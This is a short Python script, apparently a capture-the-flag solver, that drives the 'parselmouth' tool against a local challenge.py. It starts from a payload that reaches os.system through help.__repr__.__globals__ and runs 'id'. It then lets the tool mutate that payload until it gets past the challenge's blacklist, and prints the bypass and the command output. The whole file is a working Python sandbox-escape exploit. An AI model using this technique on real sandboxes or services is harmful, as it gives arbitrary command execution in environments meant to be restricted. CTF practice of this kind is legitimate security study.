import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

import parselmouth as p9h

PAYLOAD = "help.__repr__.__globals__['sys'].modules['os'].__dict__['system']('id')"

def challenge_check(payload, ignore_space=False):
    result = subprocess.run(
        ["python3", "challenge.py"],
        input=payload+"\n",
        text=True,
        capture_output=True,
    ).stdout
    if any([i in result for i in [
        "Blacklisted", 'NameError', 'AttributeError', "TypeError", "KeyError"
    ]]):
        return ["blocked"]

    return []


p9h.check = challenge_check
runner = p9h.P9H(
    PAYLOAD, versbose=1
)

result = runner.visit()
status, c_result = p9h.color_check(result)
if status:
    print("bypass success")
    print("payload:", runner.source_code)
    print("exp:", result)
    print(
        subprocess.run(
            ["python3", "challenge.py"],
            input=result + "\n",
            text=True,
            capture_output=True,
        ).stdout
    )
